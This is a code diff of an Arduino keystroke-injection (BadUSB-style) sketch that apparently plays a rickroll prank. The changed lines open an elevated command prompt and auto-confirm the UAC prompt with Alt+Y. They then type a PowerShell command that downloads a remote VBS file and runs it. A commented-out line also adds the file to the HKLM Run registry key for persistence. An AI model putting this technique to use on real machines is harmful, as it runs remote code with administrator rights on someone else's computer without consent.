@@ -18,17 +18,27 @@ void runPayload() {
 
 	// Open CMD
 	Keyboard.press(KEY_LEFT_GUI);
-	Keyboard.press('r');
+	Keyboard.press('x');
 	Keyboard.releaseAll();
-	delay(100);
-	Keyboard.print("cmd");
-	delay(100);
+	delay(200);
+	// Press the UP key 8 times
+	for (int i = 0; i < 8; i++) {
+		typeKey(KEY_UP_ARROW);
+	}
+	delay(200);
 	typeKey(KEY_RETURN);
-
+	delay(500);
+	// Bypass UAC prompt
+	Keyboard.press(KEY_LEFT_ALT);
+	Keyboard.press('y');
 	delay(100);
+	Keyboard.releaseAll();
+
+	delay(200);
 
 	// Download and run rickroll.vbs and exit when done
-	Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%TEMP%\\rickroll.vbs'); && start %TEMP%\\rickroll.vbs && exit");
+	Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && exit");
+	//Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TotallyNotShadyStartupItem /d %userprofile%\\rickroll.vbs && exit");
 	delay(100);
 	typeKey(KEY_RETURN);
 
